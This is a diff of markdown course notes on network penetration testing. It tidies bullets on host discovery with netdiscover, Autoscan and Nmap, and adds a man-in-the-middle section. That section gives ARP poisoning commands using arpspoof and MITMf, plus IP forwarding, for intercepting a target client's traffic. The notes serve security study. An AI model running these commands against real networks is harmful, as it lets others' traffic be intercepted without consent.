@@ -63,15 +63,27 @@ Here are the commands that will be used in the course
 ## Information Gathering
 After authenticating to a network you gather information about it.
 ### Using Netdiscover
-  * `netdiscover -i wlan0 -r <network internal IP>.1/24`
+* `netdiscover -i wlan0 -r <network internal IP>.1/24`
 ### Using Autoscan
-  * download [Autoscan](http://autoscan-network.com/download)
-  * add 32bit compatibility `dpkg --add-architecture i386`
-  * update `apt-get update`
-  * download and install library `apt-get install libc6:i386`
-  * install Autoscan in the terminal running `./<downaloaded file>`
-  * run Autoscan
+* download [Autoscan](http://autoscan-network.com/download)
+* add 32bit compatibility `dpkg --add-architecture i386`
+* update `apt-get update`
+* download and install library `apt-get install libc6:i386`
+* install Autoscan in the terminal running `./<downaloaded file>`
+* run Autoscan
 ### Using Nmap
-  * run `zenmap`
-  * in Target put `<network internal IP>.1/24`
-  * play arround with Profile
+* run `zenmap`
+* in Target put `<network internal IP>.1/24`
+* play arround with Profile
+## Man In The Middle (MITM) Atacks
+### ARP Poisoning Using arpspoof
+* Tell the target client that I am the router
+  * `arpsoof -i wlan0 -t <target client IP> <router IP>`
+* Tell the router that I am the target client
+  * `arpsoof -i wlan0 -t <router IP> <target client IP>`
+* Enable IP forward to allow packets to flow trough my device without beeing dropped
+  * `echo 1 > /proc/sys/net/ipv4/ip_forward`
+### ARP Poisoning Using MITMf
+* Tell the target client that I am the router
+  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`
+This way you can see all the request made by the target client
